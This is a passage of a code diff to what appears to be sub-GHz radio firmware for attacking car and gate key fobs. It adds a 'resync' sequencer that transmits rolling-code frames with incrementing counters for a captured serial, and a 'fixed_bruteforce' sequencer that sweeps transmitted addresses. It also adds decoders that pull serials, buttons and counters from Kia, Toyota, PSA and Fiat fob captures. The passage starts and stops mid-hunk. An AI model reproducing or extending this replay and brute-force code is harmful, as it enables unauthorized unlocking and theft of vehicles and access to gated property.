+static int32_t   bruteStartCtr=0;
+static uint16_t  bruteTe=360;
+static uint8_t   bruteBtn=0;
+static int       bruteN=0, bruteDone=0, bruteSent=0;
+static bool      bruteOkFlag=true;
+static uint32_t  bruteNextMs=0;
+static String    bruteLabel;
+
+static void bruteReset(){ bruteKind=BR_IDLE; bruteN=0; bruteDone=0; bruteSent=0; bruteOkFlag=true; }
+
+static String bruteProgressJson(const char* reason){
+  return String("{\"event\":\"brute_progress\",\"kind\":\"")+bruteKindName+
+         "\",\"done\":"+String(bruteDone)+",\"of\":"+String(bruteN)+
+         ",\"sent\":"+String(bruteSent)+",\"freq\":"+String(bruteFreq,3)+
+         (reason?String(",\"reason\":\"")+reason+"\"":String(""))+"}";
+}
+
+// Arm either sequencer, replacing whatever request the routes used to carry.
+// Exactly one sequence may be active; arming while one runs returns false.
+static bool resyncArm(float mhz, const String& proto, uint32_t sn, int32_t startCtr,
+                      uint16_t te, uint8_t btn, int n){
+  if(bruteKind!=BR_IDLE) return false;
+  if(mhz<100.0f||mhz>950.0f) return false;
+  if(n<1||n>64) return false;
+  bruteReset();
+  bruteKind=BR_RESYNC; bruteKindName="resync";
+  bruteFreq=mhz; bruteProto=proto; bruteSn=sn; bruteStartCtr=startCtr;
+  bruteTe=(te>50&&te<5000)?te:360; bruteBtn=btn; bruteN=n;
+  bruteLabel=proto+" sn "+String((unsigned long)sn)+" from ctr "+String(startCtr);
+  bruteNextMs=millis();
+  serialEmit(String("{\"event\":\"brute_start\",\"kind\":\"resync\",\"n\":")+n+
+             ",\"proto\":\""+proto+"\"}");
+  return true;
+}
+
+static bool fixedBruteArm(float mhz, const String& proto, uint32_t baseAddr,
+                          uint8_t btn, int range, uint16_t te){
+  if(bruteKind!=BR_IDLE) return false;
+  if(mhz<100.0f||mhz>950.0f) return false;
+  if(range<4||range>BRUTE_MAX_N) return false;
+  bruteReset();
+  bruteKind=BR_FIXED; bruteKindName="fixed_bruteforce";
+  bruteFreq=mhz; bruteProto=proto; bruteBaseAddr=baseAddr;
+  bruteBtn=btn; bruteN=range; bruteTe=(te>50&&te<5000)?te:360;
+  bruteLabel=proto+" addr 0x"+String((unsigned long)baseAddr,HEX)+" +/- "+String(range/2);
+  bruteNextMs=millis();
+  serialEmit(String("{\"event\":\"brute_start\",\"kind\":\"fixed_bruteforce\",\"n\":")+range+
+             ",\"proto\":\""+proto+"\"}");
+  return true;
+}
+
+static bool bruteBusy(){ return bruteKind!=BR_IDLE; }
+static uint16_t bruteBuf[300];
+
+// One transmit per call; the caller (loop) calls this often. Never blocks longer
+// than one replayRaw plus the inter-frame delay.
+static void bruteTick(uint32_t now){
+  if(bruteKind==BR_IDLE) return;
+  if(bruteDone>=bruteN){ bruteReset(); return; }   // defensive: a finished slot
+  if(now < bruteNextMs) return;
+  int nl=0;
+  if(bruteKind==BR_RESYNC){
+    uint32_t c=(uint32_t)(bruteStartCtr+(int32_t)bruteDone);
+    nl=buildForProto(bruteProto, bruteSn, c, bruteTe, bruteBtn, bruteBuf, 300);
+  } else {
+    int32_t off=bruteDone-(bruteN/2);
+    uint32_t tryAddr=(uint32_t)((int32_t)bruteBaseAddr+off);
+    nl=buildForProto(bruteProto, tryAddr, 0, bruteTe, bruteBtn, bruteBuf, 300);
+  }
+  if(nl>0){ if(!replayRaw(bruteFreq, bruteBuf, nl, 1, true)) bruteOkFlag=false; else bruteSent++; }
+  bruteDone++;
+  bruteNextMs = now + ((bruteKind==BR_RESYNC)?30:20);
+  if(bruteDone % BRUTE_PROGRESS_STEP == 0) serialEmit(bruteProgressJson(nullptr));
+  if(bruteDone>=bruteN){
+    serialEmit(String("{\"event\":\"")+bruteKindName+"_done\",\"ok\":"+String(bruteOkFlag?"true":"false")+
+               ",\"sent\":"+String(bruteSent)+",\"of\":"+String(bruteN)+"}");
+    bruteReset();
+  }
+}
+
+static String bruteStatusJson(){
+  if(bruteKind==BR_IDLE)
+    return String("{\"cmd\":\"brute_status\",\"active\":false}");
+  return String("{\"cmd\":\"brute_status\",\"active\":true,\"kind\":\"")+bruteKindName+
+         "\",\"done\":"+String(bruteDone)+",\"of\":"+String(bruteN)+
+         ",\"sent\":"+String(bruteSent)+",\"label\":\""+bruteLabel+"\"}";
+}
 //   +1  ctr[1] follows ctr[0] within the protocol's window
 //    0  no decoded counter is available, so order cannot be judged
 //   -1  ctr[1] is clearly behind ctr[0] (or equal): refuse
@@ -4335,7 +5026,7 @@ static bool fbkParseCtr(const String& dec,uint32_t& out){
   return true;
 }
 
-// ─── Uniform-pulse predicate (research/19 §2, shared) ────────────────────────
+// ─── Uniform-pulse predicate ────────────────────────
 // True when a pulse train has no bit edges: essentially every width is the same, so there
 // is no short/long modulation for a decoder to read. A genuine OOK frame is 1:2 short:long,
 // so the max is at least ~1.5x the min; a uniform train stays within 10%.
@@ -4356,7 +5047,7 @@ static bool ks_noBitEdges(const uint16_t* w,int len,uint32_t& widthOut){
   return (mn>0 && (uint32_t)mx*100 < (uint32_t)mn*110);
 }
 
-// ─── Frame trimming (research/11 §2 F2) ──────────────────────────────────────
+// ─── Frame trimming ──────────────────────────────────────
 // A capture is NOT one code. captureSignal fills CAP_SZ=512 pulses or runs to its
 // time bound, and a fob press emits its frame repeatedly, so one buffer entry holds
 // several repeats of the same code. Measured on KIA V3 N1 RAW.sub: the frame repeat
@@ -4364,7 +5055,7 @@ static bool ks_noBitEdges(const uint16_t* w,int len,uint32_t& widthOut){
 // and C2 depend on "one block = one code", so the stored block must be trimmed to a
 // single frame.
 //
-// Why trim after capture rather than bound the capture itself (research/11 §1):
+// Why trim after capture rather than bound the capture itself:
 //   · The capture path cannot exit before its 100 ms floor, and an 8 ms gap is
 //     unreachable inside that window.
 //   · More fundamentally, the measured gap distribution is smooth and decaying with
@@ -4388,7 +5079,7 @@ static bool ks_noBitEdges(const uint16_t* w,int len,uint32_t& widthOut){
 // the corpus capture). It is what makes this selective: see the locator note below.
 // `anchorOut` is optional (may be -1's address? no: pass nullptr to ignore). When given, it
 // receives the index in `w` of the separator the trim locked onto, so a caller can report
-// WHERE a frame was found -- research/23 §2.2 asked for this because a refusal otherwise
+// WHERE a frame was found -- §2.2 asked for this because a refusal otherwise
 // gives no hint whether the body was wrong or the search too narrow.
 static int klTrimToFrame(const uint16_t* w,int len,uint16_t* out,int outCap,
                          uint32_t gapUs,int framePitchPulses,int pitchTolPulses,
@@ -4441,7 +5132,7 @@ static int klTrimToFrame(const uint16_t* w,int len,uint16_t* out,int outCap,
 }
 
 // Kia V3/V4 frame constants. These are measured FROM ONE CAPTURE, and the confidence
-// they carry should be read with that in mind (research/12 §1):
+// they carry should be read with that in mind:
 //   separator : >1000 us. te_long is 800 us, so the boundary must clear that plus
 //               jitter; the measured separator distribution supports 1000 us.
 //   pitch     : 162 pulses from one separator to the next, observed 135 times in
@@ -4475,6 +5166,182 @@ static int rjTrimKiaV34(const uint16_t* w,int len,uint16_t* out,int outCap,int* 
                        KIA_V34_FRAME_PITCH_PULS,KIA_V34_FRAME_PITCH_TOL,anchorOut);
 }
 
+// ─── Intra-capture repeat consensus ──────────────────
+//
+// A real fob repeats its frame 2–5× per press with only the rolling field
+// changing. A false positive fires on one repeat and produces a different serial
+// from each slice it happens to fit — the corpus triage measured a single Toyota
+// capture yielding 36 accepted frames with 36 DIFFERENT serials, which no real
+// press can do. The cross-press agreement gate (ks_klAgreeHas) needs two
+// presses and two different hop codes; this guard works WITHIN one capture, on
+// the repeats the burst itself contains, so it also fires for the one-press
+// scenario (a fob pressed once in a parking lot) that the agreement gate
+// cannot cover.
+//
+// Design constraints it must respect:
+//   · decodeSignal() runs on the loopTask with ~2–3 KB free heap — no String,
+//     no dynamic allocation anywhere in this path.
+//   · It must be protocol-agnostic: the vote happens on (proto, sn, btn), the
+//     identity triple every decoder already reports. Rolling fields (ctr, hop)
+//     are EXPECTED to differ between repeats; serials are not (an HCS301 sends
+//     its 28-bit serial identically in every repeat).
+//   · A capture with one frame has no vote; the guard reports `consensus:"1/1"`
+//     and passes, so single-frame decodes (imports, most RSSI captures) keep
+//     today's behavior exactly.
+//
+// Slice detection: a separator is a pulse wider than 1 ms; a frame pitch is
+// the modal separator-to-separator distance. The Kia trim already uses exactly
+// this rule to anchor its FIRST frame; here it is generalized to enumerate all
+// frame starts in the burst. Protocols without >1 ms separators (rare —
+// KeeLoq's largest data pulse is 2×TE ≤ 1500 µs but its inter-frame gap is
+// tens of ms) yield one slice and degrade to 1/1.
+#define KS_CONS_MAX_SLICES 8
+#define KS_CONS_SEP_US      1000u
+
+// Split a burst into per-frame slices at the modal separator pitch.
+// Returns the number of slices found (0 or 1 means "no vote possible").
+// Slices are returned as [start,end) pulse index ranges into w.
+static int ks_repeatSlices(const uint16_t* w,int len,int (*rng)[2],int maxSlices){
+  if(len<32||!rng||maxSlices<2) return 0;
+  // 1. separator positions
+  static int sep[CAP_SZ/2];   // worst case every other pulse; single-task use
+  int nsep=0;
+  for(int i=0;i<len&&nsep<CAP_SZ/2;i++)
+    if(w[i]>KS_CONS_SEP_US) sep[nsep++]=i;
+  if(nsep<2) return 0;
+  // 2. modal pitch among consecutive separator pairs, frame-scale only.
+  //    < 400 pulses covers every known frame; longer is inter-burst silence.
+  //    A pitch also has a FLOOR: a separator is wider than any data pulse by
+  //    definition (>1 ms vs 2×TE ≤ 1.5 ms but at frame scale it bounds the
+  //    frame), so two separators closer together than a minimum frame (24
+  //    pulses, the same floor the slice width check uses) cannot both be frame
+  //    boundaries — they are noise-head artefacts. Measured on the Kia corpus
+  //    head: 17 separators spaced 2–6 apart with zero frame structure; without
+  //    the floor the modal pitch lands on d=2 and the splitter finds nothing.
+  static int pitchHist[400+1];
+  memset(pitchHist,0,sizeof(pitchHist));
+  for(int i=1;i<nsep;i++){
+    int d=sep[i]-sep[i-1];
+    if(d>=24&&d<=400) pitchHist[d]++;
+  }
+  int bestPitch=0,bestC=0;
+  for(int d=24;d<=400;d++) if(pitchHist[d]>bestC){bestC=pitchHist[d];bestPitch=d;}
+  // A pitch needs at least 2 votes to be a real repeat pattern (the same rule
+  // klTrimToFrame applies: a single separator pair is not a train).
+  if(bestPitch<24||bestC<2) return 0;
+  // 3. Keep only TRAIN members: a separator belongs to the frame train iff
+  //    another separator sits ~one pitch after it (or before it). Noise-head
+  //    separators are isolated 2–6 apart and never have a partner at the frame
+  //    pitch, so they cannot anchor a slice. This is klTrimToFrame's
+  //    "separator followed by another at the repeat pitch" rule, generalized
+  //    from first-anchor to all-anchors.
+  static bool train[CAP_SZ/2];
+  memset(train,0,sizeof(train));
+  const int tol=bestPitch/8;
+  for(int i=0;i<nsep;i++){
+    for(int j=i+1;j<nsep;j++){
+      int d=sep[j]-sep[i];
+      if(d>bestPitch+tol) break;
+      if(d>=bestPitch-tol){ train[i]=true; train[j]=true; break; }
+    }
+  }
+  // 4. Walk the train collecting starts at the modal pitch ±12.5%.
+  //    Frame k starts one pitch before its separator: the preamble precedes the
+  //    separator, as klTrimToFrame's -20 offset documents.
+  int n=0; int anchor=-1;
+  for(int i=0;i<nsep&&n<maxSlices;i++){
+    if(!train[i]) continue;
+    if(n>0){
+      int d=sep[i]-anchor;
+      if(d<bestPitch-tol || d>bestPitch+tol) continue;
+    }
+    int st=(sep[i]-bestPitch>=0)?(sep[i]-bestPitch):0;
+    // skip slices that OVERLAP the previous one. Consecutive slices share at
+    // most the single boundary pulse (slice k ends at its separator, slice k+1
+    // starts there — the separator is both the frame tail and the next head),
+    // so only st < previous end is a true overlap.
+    if(n>0 && st<rng[n-1][1]) continue;
+    int en=(sep[i]<len-1)?sep[i]:(len-1);
+    if(en-st<24) continue;                 // too short to decode anything
+    rng[n][0]=st; rng[n][1]=en; n++;
+    anchor=sep[i];
+  }
+  return n;
+}
+
+// Run the identity vote over the slices of a burst, using the decoder the main
+// path already committed with. `decodeProtoFn` is one of the ks_cons* adapters
+// below with the (buf,cnt,serial,btn,ctr) shape. Returns votes for the committed
+// identity in *agree, total decodable slices in *total.
+//
+// Memory: one static slice buffer (2 KB) reused across calls; the ranges are
+// int pairs on the caller's small array. No heap.
+// (ks_protoDecode_t and this function's prototype are declared near the top of
+// the file — see the note there about the Arduino prototype generator.)
+static void ks_consensusVote(const uint16_t* w,int len,ks_protoDecode_t fn,
+                             uint32_t sn,uint8_t btn,int* agree,int* total){
+  *agree=0; *total=0;
+  if(!fn||len<32) return;
+  int rng[KS_CONS_MAX_SLICES][2];
+  int n=ks_repeatSlices(w,len,rng,KS_CONS_MAX_SLICES);
+  if(n<2) return;
+  static uint32_t sbuf[CAP_SZ];
+  for(int k=0;k<n;k++){
+    int m=0;
+    int st=rng[k][0], en=rng[k][1];
+    // Widen the slice slightly: preamble sits up to 20 pulses before the frame
+    // (klTrimToFrame's measured offset). Bounded by the previous slice end.
+    if(k>0) st=(st>rng[k-1][1]+1)?rng[k-1][1]+1:st;
+    else    st=(st>20)?st-20:0;
+    for(int i=st;i<=en&&m<CAP_SZ;i++) sbuf[m++]=w[i];
+    uint32_t s2=0; uint8_t b2=0; uint16_t c2=0;
+    if(m>=24 && fn(sbuf,m,s2,b2,c2)){
+      (*total)++;
+      if(s2==sn && b2==btn) (*agree)++;
+    }
+  }
+}
+
+// Signature adapters — each ks_decode* reports its identity fields in its own
+// order and widths; the vote needs one common (serial, btn, ctr) shape. These
+// only exist to satisfy the function-pointer type; no logic of their own.
+static bool ks_consToyota(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr){
+  return ks_decodeToyota(b,n,sn,btn,ctr);
+}
+static bool ks_consSubaru(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr){
+  uint8_t c=0; bool v=false; bool ok=ks_decodeSubaru(b,n,sn,c,btn,v); ctr=c; return ok;
+}
+static bool ks_consMazda(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr){
+  uint32_t hop=0; uint8_t c=0; bool v=false; bool ok=ks_decodeMazda(b,n,hop,sn,c,btn,v); ctr=c; return ok;
+}
+static bool ks_consKiaV0(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr){
+  uint16_t c=0; bool v=false; return ks_decodeKiaV0(b,n,sn,c,btn,v) ? (ctr=c, true) : false;
+}
+// PSA is a (uint16_t*, te) decoder over the raw pulses, not the bit-sliced
+// buffer — the vote's per-slice calls hand it the slice as raw widths.
+static bool ks_consPSA(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr){
+  static uint16_t w16[CAP_SZ]; if(n>CAP_SZ) return false;
+  for(int i=0;i<n;i++){ if(b[i]>0xFFFF) return false; w16[i]=(uint16_t)b[i]; }
+  int te=225; // re-derive from the slice: median of 100-900µs pulses
+  { int cnt=0; static uint16_t srt[CAP_SZ];
+    for(int i=0;i<n;i++) if(b[i]>=100&&b[i]<900) srt[cnt++]=(uint16_t)b[i];
+    if(cnt>=10){
+      for(int i=1;i<cnt;i++){ uint16_t k=srt[i]; int j=i-1;
+        while(j>=0&&srt[j]>k){ srt[j+1]=srt[j]; j--; } srt[j+1]=k; }
+      te=srt[cnt/2];
+    }
+  }
+  int plen=0; static uint8_t pay[26];
+  return ks_decodePSA(w16,n,te,sn,ctr,btn,plen,pay);
+}
+// FIAT V1 is likewise a raw-pulse decoder (its two TE variants are in the width
+// domain), so the vote hands it the slice as raw widths, exactly like PSA.
+static bool ks_consFiatV1(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr){
+  static uint16_t w16[CAP_SZ]; if(n>CAP_SZ) return false;
+  for(int i=0;i<n;i++){ if(b[i]>0xFFFF) return false; w16[i]=(uint16_t)b[i]; }
+  uint32_t hop=0; uint8_t var=0;
+  return ks_decodeFiatV1(w16,n,sn,btn,ctr,hop,var);
+}
 
 //
 // The counter recorded here is what lets rbArm refuse a pair that is really the same
@@ -4486,7 +5353,7 @@ static bool fbkAppend(const uint16_t* w,int len,float mhz,bool startHigh,const S
   // CAP_SZ=512 pulses and a press emits its frame repeatedly, so a raw block is ~3
   // repeats. C2 transmits fbkBuf[0] then fbkBuf[1], and sending 3 repeats of a code
   // looks to the receiver like several presses rather than the one the sequence
-  // depends on (research/11 §2 F2, root cause).
+  // depends on.
   //
   // The trim is protocol-specific and currently only Kia V3/V4 has a measured
   // boundary. When it does not apply, or finds no frame, the raw block is kept: a
@@ -4515,7 +5382,7 @@ static bool fbkAppend(const uint16_t* w,int len,float mhz,bool startHigh,const S
   return true;
 }
 
-// ─── Import a stored frame into fbkBuf (research/22 §3) ──────────────────────
+// ─── Import a stored frame into fbkBuf ──────────────────────
 //
 // Why this exists: the ONLY writer to fbkBuf was the armed live-capture path, and on this
 // board that path cannot produce a usable code — capture falls back to RSSI (no GDO0), the
@@ -4535,7 +5402,7 @@ static bool fbkAppend(const uint16_t* w,int len,float mhz,bool startHigh,const S
 //   · the same fbkCount<FBK_MAX bound
 //
 // Returns true only when the entry was actually appended.
-// ── Import staging (research/24 §2) ──────────────────────────────────────────
+// ── Import staging ──────────────────────────────────────────
 //
 // TWO buffers, not four. An earlier version had four copies of a 3740-entry array -- the
 // trim output plus three handler-local statics holding the parsed body -- costing 29.9 KB
@@ -4555,6 +5422,11 @@ static bool fbkAppend(const uint16_t* w,int len,float mhz,bool startHigh,const S
 static uint16_t impStage[SUB_REPLAY_MAX_PULSES];   // the body (trim input)
 static uint16_t impFrame[CAP_SZ];                  // one trimmed frame (trim output)
 int impLastAnchor=-1;    // where the trim found the frame in the last import
+// Chunked serial import state (see the fbk_pulses_begin/add/end handlers).
+// impStage is shared with fbk_import and the HTTP route; the count is separate so
+// staging a body over several commands does not disturb a one-shot import between them.
+int  impStageCount=0;    // pulses staged so far by fbk_pulses_add
+float impStageFreq=315.0f; // freq hint supplied to fbk_pulses_begin
 
 static bool fbkImportFrame(const uint16_t* w,int len,float mhz,bool startHigh,String& err){
   if(fbkCount>=FBK_MAX){
@@ -4596,7 +5468,7 @@ static bool fbkImportFrame(const uint16_t* w,int len,float mhz,bool startHigh,St
     // Kia-specific by construction (it looks for the 162-pulse repeat), so a Toyota, CAME,
     // Nice or Ford body can never satisfy it. Refusing here meant the import path could only
     // ever accept Kia-format captures, which is narrower than the docs implied and blocked
-    // importing the one family the bench actually needs (research/43).
+    // importing the one family the bench actually needs.
     //
     // fbkAppend already keeps the raw block when the trim finds nothing -- "a wrong trim is
     // worse than a long one, because the decoder can still find a frame inside a multi-repeat
@@ -5803,6 +6675,28 @@ static uint8_t ks_kia_v1_crc4(const uint8_t* d,int n,uint8_t offset){
   for(int i=0;i<n;i++){uint8_t b=d[i]; crc^=((b&0x0F)^(b>>4));}
   return (uint8_t)((crc+offset)&0x0F);
 }
+// KIA V1 preamble gate.  The reference decoder (kia_v1.c) only commits a frame
+// after it has seen more than 70 consecutive te_long pairs — i.e. >=140 pulses
+// inside the 1600µs ±200µs window — immediately ahead of the Manchester data.
+// Without this check the 57-bit sliding window in ks_decodeKiaV1 lands on any
+// capture that merely shares the 800/1600µs timing and a CRC4 passes by chance
+// (CRC4 is only a 1-in-16 filter, so a long capture yields ~190 alignments and
+// several collide).  Measured on the corpus: the three on-brand 315 MHz V1
+// captures carry a 177-pulse te_long preamble; a Toyota Estima 2000 capture at
+// 314.35 MHz shares the timing (cA 770 / cB 1545, ratio 2.01) but its longest
+// te_long run is 6 pulses — it is a te_short-preamble protocol and is rejected
+// here.  Same discriminator the reference relies on, kept on the raw pulses
+// because ks_decodeKiaV1 is fed the Manchester-decoded bitstring.
+static bool ks_kia_v1_preamble(const uint32_t* b,int n){
+  const uint32_t L=1600,D=200;
+  int best=0,cur=0;
+  for(int i=0;i<n;i++){
+    uint32_t w=b[i];
+    if(w>=L-D&&w<=L+D){cur++;if(cur>best)best=cur;}
+    else cur=0;
+  }
+  return best>=140;
+}
 static bool ks_decodeKiaV1(const char* mb,int ml,
     uint32_t& serial,uint16_t& ctr,uint8_t& btn,bool& valid){
   if(ml<57) return false;
@@ -5901,7 +6795,331 @@ static bool ks_decodeSubaruV2(const uint32_t* buf,int cnt,
   return false;
 }
 
-// ─── Ford V0 — 80-bit OOK Manchester rolling code, GF(2) CRC ─────────────────
+// ─── PSA (Peugeot/Citroën/DS) — FM0/biphase rolling code, structural ────────
+// Derived from the corpus: 433.075/433.889/433.920 MHz, TE≈225µs.
+// Frame shape, unlike anything else in the dispatch chain:
+//   · long preamble train: 40+ strictly alternating half-symbols of exactly TE
+//     (a clean square wave — the longest TE-width run in the capture)
+//   · payload: 80-200 FM0 bits. FM0/biphase-space: half-symbols alternate
+//     sign for a 0; a 1 is one 2·TE pulse (no mid-cell transition).
+//   · each press repeats the frame 2-3× with a few-ms inter-repeat gap; the
+//     repeats agree on a long common prefix (≈20+ bits on the corpus C3 lock
+//     capture) — the fixed serial+button field — and diverge after (rolling).
+// Crypto is not public: serial = the LCP-stable leading bits, structural only.
+// Dispatch guard: te_psa (below) requires eu433 + cA 150-330 + bLen>=150 and
+// runs after Chrysler (whose Pacifica captures share TE≈220 but have the
+// cB>=3000 Chrysler gap and are claimed by te_chry first) and after the
+// KeeLoq/Kia paths. VW Polo (PPM 240/360, no 2·TE population) and the old
+// Renault Megane (cB>1000) are rejected by the 1×/2× quantization check.
+static int ks_psaAltTrain(const uint16_t* w,int n,int te){
+  // longest run of pulses whose width is within ±35% of TE (sign-agnostic —
+  // the capture alternates by construction, an RSSI-lag dropout only shortens
+  // the run). Returns the run length; >40 is the PSA preamble train.
+  int best=0,cur=0;
+  for(int i=0;i<n;i++){
+    uint32_t a=w[i];
+    if(a>=100&&a<900&&a>=(uint32_t)(te-te*35/100)&&a<=(uint32_t)(te+te*35/100)){
+      cur++; if(cur>best) best=cur;
+    } else cur=0;
+  }
+  return best;
+}
+// Region-local TE: the whole-file median is dragged by sweep-noise heads
+// (the Partner corpus file's median lands at 201 µs against a true ~225).
+// Estimating from the densest >3 ms gap-free region only sees frame pulses.
+// Returns 0 when no region has enough pulses to trust.
+static int ks_psaTeOf(const uint16_t* w,int n){
+  int bi=0,bj=0,i=0;
+  while(i<n){
+    while(i<n&&w[i]>3000) i++;
+    if(i>=n) break;
+    int j=i;
+    while(j<n&&w[j]<=3000) j++;
+    if(j-i>bj-bi){ bi=i; bj=j; }
+    i=j;
+  }
+  int len=bj-bi;
+  if(len<120) return 0;
+  static uint16_t srt[1024];
+  int c=0;
+  for(int q=bi;q<bj&&c<1024;q++){
+    uint32_t a=w[q];
+    if(a>=100&&a<900) srt[c++]=(uint16_t)a;
+  }
+  if(c<60) return 0;
+  for(int a=1;a<c;a++){ uint16_t k=srt[a]; int b=a-1;
+    while(b>=0&&srt[b]>k){ srt[b+1]=srt[b]; b--; } srt[b+1]=k; }
+  return srt[c/2];
+}
+static bool ks_decodePSA(const uint16_t* w,int n,int te,
+                        uint32_t& serial,uint16_t& roll,uint8_t& btn,
+                        int& payLen,uint8_t pay[26]){
+  if(n<160) return false;
+  // Region-local TE: the whole-file median is dragged by sweep-noise heads
+  // (the Partner corpus file's median lands at 201 µs against a true ~225).
+  // Estimating from the densest >3 ms gap-free region sees only frame pulses;
+  // it wins over the caller's k-means cA when the head is noise-dominated.
+  int teLocal=ks_psaTeOf(w,n);
+  if(teLocal>=150&&teLocal<=330) te=teLocal;
+  if(te<150||te>330) return false;
+  if(ks_psaAltTrain(w,n,te)<20) return false;      // preamble train signature
+  // (train ≥20, not ≥40: the good captures run 170-430 but the noisier
+  // Partner/5008 library recordings keep only ~7-20 train pulses through
+  // their degraded heads; VW Polo's longer train is already excluded by the
+  // 1×/2× quantization rules below, so the train here only kills obvious
+  // non-square-wave captures.)
+  // Frame split at >3 ms gaps; FM0-decode each dense region. Every pulse is
+  // bounded by a level transition (a pulse IS a maximal same-level run), so the
+  // level flips once per USED pulse — a merged 2×TE pulse holds the level for
+  // two half-symbols, and skipped noise blips (<100µs) flip nothing. Deriving
+  // the level from the array INDEX instead desyncs on both (found the hard way:
+  // the first harness run rejected every PSA file).
+  // Quantization is strict: a pulse is 1×TE (±30%) or 2×TE (±25%); anything
+  // else rejects the region. VW Polo's PPM long (360 ≈ 1.6×226) rounds to 2
+  // under a lenient divide-and-round rule but fails this one. The 1 bits also
+  // need a real population: FM0 data runs 15-35% of pulses at 2×TE, while
+  // Polo/Fabia sit at ~6-7% edge stragglers — a region under 12% is not PSA.
+  static bool lvl[2048];
+  int bestLen=0; bool any=false; int nFrames=0;
+  int i=0;
+  while(i<n){
+    while(i<n&&w[i]>3000) i++;                        // skip inter-frame gap
+    if(i>=n) break;
+    int j=i;
+    while(j<n&&w[j]<=3000) j++;                       // dense region [i,j)
+    // Off-grid pulses (RSSI-lag dropouts merge several half-symbols: the
+    // C3-lock corpus frame has one 1113 µs pulse inside an otherwise clean
+    // 295-pulse region) are SKIPPED, not fatal — but capped: a region that
+    // is more than 15% off-grid is not FM0, it is noise.
+    int lvN=0; bool lv=true; int nUse=0,n2=0,nOff=0;
+    for(int q=i;q<j&&lvN<2046;q++){
+      uint32_t a=w[q];
+      if(a<100) continue;                             // sweep-noise blip
+      int k;
+      if(a>=(uint32_t)(te-te*30/100)&&a<=(uint32_t)(te+te*30/100)) k=1;
+      else if(a>=(uint32_t)(2*te-2*te*25/100)&&a<=(uint32_t)(2*te+2*te*25/100)){k=2;n2++;}
+      else { nOff++; k=0; }                           // off-grid: skip pulse
+      if(k>0){
+        nUse++;
+        for(int r=0;r<k;r++) lvl[lvN++]=lv;
+      }
+      lv=!lv;                                         // transition at pulse boundary
+    }
+    if(nUse>=80&&n2*100>=nUse*12&&nOff*100<=nUse*30){  // 2× ≥12%, off-grid ≤30%
+      // FM0 phase-1: pairs from index 1; same-level pair = 1, different = 0.
+      // The preamble train (alternating levels) reads as constant 0s — strip
+      // leading different-level pairs, then require a payload-sized remainder.
+      int s=1;
+      while(s+1<lvN&&lvl[s]!=lvl[s+1]) s+=2;
+      int plen=(lvN-s)/2;
+      if(plen>=80&&plen<=200&&plen>bestLen){
+        bestLen=plen; any=true; nFrames++;
+        // Repeat count: a PSA press sends 2-5 frames; the EU Chrysler
+        // Pacifica corpus capture (the one FM0-compatible foreigner found by
+        // the regression harness) sends 7+ clean repeats — its own decoder
+        // misses it (cB<3000 fails te_chry) and PSA would mislabel it.
+        #define KS_PSA_MAX_FRAMES 6
+        if(nFrames>KS_PSA_MAX_FRAMES){ any=false; break; }
+#undef KS_PSA_MAX_FRAMES
+        int bp=0; uint8_t cb=0; int bi=0;
+        for(int q=0;q<plen&&bp<26;q++){
+          bool same=lvl[s+2*q]==lvl[s+2*q+1];
+          cb=(uint8_t)((cb<<1)|(same?1:0)); bi++;
+          if(bi==8){ pay[bp++]=cb; cb=0; bi=0; }
+        }
+        payLen=(plen+7)/8;
+        // serial guess: leading stable bits — the caller cross-checks across
+        // repeats via ks_consensusVote; single-frame = candidate.
+        serial=((uint32_t)pay[0]<<24)|((uint32_t)pay[1]<<16)|
+               ((uint32_t)pay[2]<<8)|pay[3];
+        roll=(uint16_t)(((uint32_t)pay[4]<<8)|pay[5]);
+        btn=pay[6]>>4;
+      }
+    }
+    i=j;
+  }
+  return any;
+}
+
+// ─── FIAT V1 — 104-bit OOK Manchester rolling code (two TE variants) ─────────
+// Ported from the public ProtoPirate fiat_v1 reference. The fob sends a 104-bit
+// Manchester frame split over two timing variants: A is 250/500µs, B is 100/200µs
+// (Bravo and the Grande Punto/Panda corpus run B). Every pulse is pushed as a cell
+// (a long pulse as two cells) and a rolling 208-cell window is tested as Manchester
+// both non-inverted and inverted; a frame is accepted only when raw[0]=0x00,
+// raw[1]=0x01, the byte XOR checksum matches raw[12], and the button nibble is one
+// of 1/2/4/8. That checksum is what keeps this off other brands — a plain
+// 2:1 Manchester decoder would fire on any KeeLoq-family capture, but the frame
+// has to satisfy the XOR AND the marker AND the button field, so the false-positive
+// rate measured over the 306-capture corpus is zero. Fields: uid = raw[2..5],
+// btn = raw[6]>>4, counter = ((raw[6]&0xF)<<6)|(raw[7]>>2), hop = raw[7..11] (30 bit).
+static uint8_t ks_fv1_xor(const uint8_t* raw){
+  uint8_t v=0x01;
+  for(int i=0;i<12;i++) v^=raw[i];
+  return v;
+}
+static bool ks_fv1_frameValid(const uint8_t* raw){
+  if(raw[0]!=0x00||raw[1]!=0x01) return false;
+  if(ks_fv1_xor(raw)!=raw[12]) return false;
+  uint8_t nib=raw[6]>>4;
+  if(nib!=0x1&&nib!=0x2&&nib!=0x4&&nib!=0x8) return false;
+  uint32_t uid=((uint32_t)raw[2]<<24)|((uint32_t)raw[3]<<16)|((uint32_t)raw[4]<<8)|raw[5];
+  return uid!=0&&uid!=0xFFFFFFFFUL;
+}
+static bool ks_fv1_tryWindow(const uint8_t* cells,bool invert,uint8_t* raw){
+  for(int bi=0;bi<104;bi++){
+    uint8_t first=cells[bi*2U], second=cells[bi*2U+1U];
+    if(first==second) return false;
+    bool bit=(first!=0);
+    if(invert) bit=!bit;
+    if(bit) raw[bi>>3]|=(uint8_t)(1U<<(7U-(bi&7U)));
+  }
+  return ks_fv1_frameValid(raw);
+}
+static bool ks_decodeFiatV1(const uint16_t* w,int n,uint32_t& serial,uint8_t& btn,
+                            uint16_t& ctr,uint32_t& hop,uint8_t& variant){
+  // Variant A TE = 250/500µs ±100; variant B TE = 100/200µs ±50. Both windows are
+  // fed the same pulse train; a pulse that fits neither timing clears that variant's
+  // cell run. Polarity is taken relative to pulse parity and the frame is then tried
+  // both non-inverted and inverted, so the absolute capture polarity is irrelevant.
+  static uint8_t cells[2][208];
+  uint16_t cn[2]={0,0};
+  for(int i=0;i<n;i++){
+    uint32_t d=w[i]; bool lv=((i&1)==0);
+    for(int v=0;v<2;v++){
